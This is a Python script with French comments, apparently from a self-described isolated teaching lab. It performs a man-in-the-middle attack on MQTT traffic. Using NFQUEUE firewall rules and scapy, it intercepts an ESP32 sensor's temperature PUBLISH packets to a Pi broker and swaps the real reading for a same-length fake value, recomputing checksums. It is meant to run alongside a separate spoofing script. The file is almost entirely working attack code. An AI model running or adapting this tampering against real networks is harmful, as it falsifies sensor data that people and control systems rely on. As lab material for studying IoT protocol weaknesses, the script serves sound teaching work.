#!/usr/bin/env python3
"""
alter.py — Altération MITM en direct d'un payload MQTT sur TCP.
Intercepte les PUBLISH ESP32 -> Pi sur le topic température et remplace
la valeur réelle par une fausse, DE MÊME LONGUEUR (contrainte TCP).

Prérequis (en parallèle) : spoof.py qui tourne + net.ipv4.ip_forward=1.
Usage : sudo ./venv/bin/python3 alter.py
Arrêt : Ctrl+C -> retire la règle NFQUEUE et restaure l'état étape 3.
Cadre : laboratoire isolé dont je suis propriétaire (pédagogique).
"""
import re
import subprocess
import sys
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

IFACE = "wlp0s20f3"
ESP   = "192.168.50.165"          # capteur (source des PUBLISH)
PI    = "192.168.50.182"          # broker (destination)
QNUM  = 1                         # numéro de file NFQUEUE
TOPIC = b"labo/capteur1/temperature"
FAKE  = b"99.9"                   # DOIT faire la même longueur que la vraie valeur

# Capture la valeur numérique qui suit immédiatement le topic dans le PUBLISH
VALUE_RE = re.compile(re.escape(TOPIC) + rb"(\d+\.\d+)")

def fw(*args):
    """Appelle firewall-cmd ; check=False pour ne pas planter si la règle n'existe pas."""
    subprocess.run(["firewall-cmd", *args], check=False,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def setup_rules():
    # On retire l'ACCEPT large posé à l'étape 3 (priorité 0)...
    fw("--direct", "--remove-rule", "ipv4", "filter", "FORWARD", "0",
       "-i", IFACE, "-o", IFACE, "-j", "ACCEPT")
    # ...et on met la règle NFQUEUE EN PREMIER (priorité 0) : ESP32 -> Pi, MQTT -> file
    fw("--direct", "--add-rule", "ipv4", "filter", "FORWARD", "0",
       "-p", "tcp", "-s", ESP, "-d", PI, "--dport", "1883",
       "-j", "NFQUEUE", "--queue-num", str(QNUM))
    # ACCEPT pour tout le reste du trafic wifi<->wifi (priorité 1, en dessous)
    fw("--direct", "--add-rule", "ipv4", "filter", "FORWARD", "1",
       "-i", IFACE, "-o", IFACE, "-j", "ACCEPT")

def teardown_rules():
    # On enlève nos deux règles...
    fw("--direct", "--remove-rule", "ipv4", "filter", "FORWARD", "0",
       "-p", "tcp", "-s", ESP, "-d", PI, "--dport", "1883",
       "-j", "NFQUEUE", "--queue-num", str(QNUM))
    fw("--direct", "--remove-rule", "ipv4", "filter", "FORWARD", "1",
       "-i", IFACE, "-o", IFACE, "-j", "ACCEPT")
    # ...et on restaure l'état "interception" de l'étape 3 (ACCEPT large priorité 0)
    fw("--direct", "--add-rule", "ipv4", "filter", "FORWARD", "0",
       "-i", IFACE, "-o", IFACE, "-j", "ACCEPT")

def handle(pkt):
    ip = IP(pkt.get_payload())
    if ip.haslayer(TCP) and ip.haslayer(Raw):
        raw = bytes(ip[Raw].load)
        m = VALUE_RE.search(raw)
        if m:
            real = m.group(1)
            if len(real) == len(FAKE):
                # Remplacement chirurgical : uniquement les octets de la valeur
                new = raw[:m.start(1)] + FAKE + raw[m.end(1):]
                ip[Raw].load = new
                # On force le recalcul des longueurs/checksums
                del ip[IP].len
                del ip[IP].chksum
                del ip[TCP].chksum
                pkt.set_payload(bytes(ip))
                print(f"[ALTÉRÉ] {real.decode()} -> {FAKE.decode()}", flush=True)
            else:
                # Longueur différente : altérer casserait la séquence TCP -> on laisse passer
                print(f"[SKIP] valeur {real.decode()!r} de longueur != {len(FAKE)}, "
                      f"non altérée (contrainte TCP)", flush=True)
    pkt.accept()

def main():
    print("[*] Mise en place de la règle NFQUEUE...")
    setup_rules()
    nfq = NetfilterQueue()
    nfq.bind(QNUM, handle)
    print(f"[*] Altération active : {TOPIC.decode()} -> payload forcé à {FAKE.decode()}")
    print("[*] Ctrl+C pour arreter et restaurer l'etat (interception etape 3).")
    try:
        nfq.run()
    except KeyboardInterrupt:
        print("\n[*] Arret...")
    finally:
        nfq.unbind()
        teardown_rules()
        print("[*] Regle NFQUEUE retiree, etat restaure.")

if __name__ == "__main__":
    main()
